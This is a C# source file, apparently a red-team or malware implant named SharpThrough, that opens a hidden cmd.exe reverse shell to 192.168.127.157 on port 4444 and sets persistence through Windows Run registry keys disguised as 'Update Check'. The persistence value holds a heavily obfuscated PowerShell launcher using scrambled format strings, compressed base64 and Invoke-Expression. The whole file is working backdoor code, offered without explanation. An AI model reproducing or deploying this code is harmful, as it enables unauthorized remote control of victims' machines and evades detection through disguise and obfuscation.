using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;
using Microsoft.Win32;

namespace SharpThrough
{
    public class RS
    {
      
        public RS(){
            Main();
        }
        static StreamWriter streamWriter;

        public static void Main()
        {
            try{
                RegistryKey first_key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                 modifyReg(first_key);
            }
            catch (Exception ex){{}}
            try{
                RegistryKey second_key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                modifyReg(second_key);
             }
            catch (Exception ex){{}}
            string ip = "192.168.127.157";
            int port = 4444;
            using (TcpClient client = new TcpClient(ip, port))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);
                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.ErrorDataReceived += P_ErrorDataReceived;
                        p.Start();
                        p.BeginOutputReadLine();
                        p.BeginErrorReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        private static void P_ErrorDataReceived(object sender, DataReceivedEventArgs e)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(e.Data))
            {
                try
                {
                    strOutput.Append(e.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err)
                {}
            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err){}
            }
        }
        private static void modifyReg(RegistryKey key){
            if (key != null){
            try{
                var launch = "CMD.exE /c  \"sET  ZNIj= (((\"{89}{77}{97}{72}{91}{57}{99}{79}{40}{125}{30}{114}{11}{12}{68}{48}{104}{24}{22}{61}{120}{122}{103}{112}{107}{32}{83}{108}{113}{38}{49}{3}{67}{58}{19}{121}{71}{73}{118}{51}{21}{100}{34}{27}{13}{54}{80}{66}{10}{85}{75}{36}{88}{25}{55}{62}{101}{60}{115}{90}{39}{1}{18}{92}{102}{94}{119}{20}{111}{76}{98}{110}{35}{105}{47}{64}{93}{124}{123}{129}{81}{86}{106}{33}{50}{41}{109}{52}{128}{23}{117}{8}{4}{53}{82}{46}{59}{15}{14}{6}{45}{96}{95}{7}{43}{16}{17}{74}{56}{78}{126}{37}{5}{31}{84}{2}{65}{29}{87}{42}{127}{70}{116}{9}{28}{0}{69}{44}{63}{26}\" -f 'A','W','ExT.','Ct','goWn',' ), ','Pr','reSsI','v7uSsba',').','fROM','e[','3,11,','m','cOM','O.','e]:',':','Sl4IGcE','On.d','Uu6uAb','Em',' ','t',' ','PETY7rCsIwDIVf','d( )','te','rE','O','PE).nA','[',' ( ','xP1','Ys','gVB0B/gENVSYOOUG','TRiN','s)','j','3','dr*','VTk/r4','ng','ONmod','o','essIOn.','w==v','r5','PEvPE) (n','e','Z',' [Io.m','s9fa','ytwzVbyEd37','.cONVE','pf','oMp','aBLE ','SsI','PE ),[i','unlj6','syS','RPHGhvcxf','eN','ySqcG0x','enC',']::','  IO.cOMPRe','2]-JOInv','dT',':','TeSTrE','ar','aM','dEc','64S','gdbCG',' (','re','PE*m','rt','T','yB','nEW','T','bAsE','GGBn2','DI','g(v','.','nf0re','i','HL4EiFIimo','9Qisxyme','s','oMP','C','(V','M','v','ORySTREAm] [S','7Hj6A','jV','r','EW-ObjeCt','bQ','ch','Er(','-O','s','tw','6','EAMREad','b','M','Gi','aSCiI) ','r2yD','(','lkMRm','T','EfLA','eM.io.ST','UKRg7TR','i','v','S',']:','Hnj1IHPK','MRO2abzv'))-ReplACE'vPE',[CHaR]39)^| ^& ( ([strING]$VeRBOSEpReFERenCE)[1,3]+'X'-JoiN'') && set   qXnVC=EchO  IEX  ([eNVIRoNmEnt]::GetEnVironMEntvariABLE('zNIJ','PRoCEsS'))^|POWErSHell -noPRo -nOniNT -Nolo    ${INPut} ^^^| iNvOkE-eXPreSsiON &&  CMD.exE /c%QxnVC%\"";
                key.SetValue("Update Check", launch);
                key.Close();
            }
            catch (Exception err){{}}
            }
        }
    }
}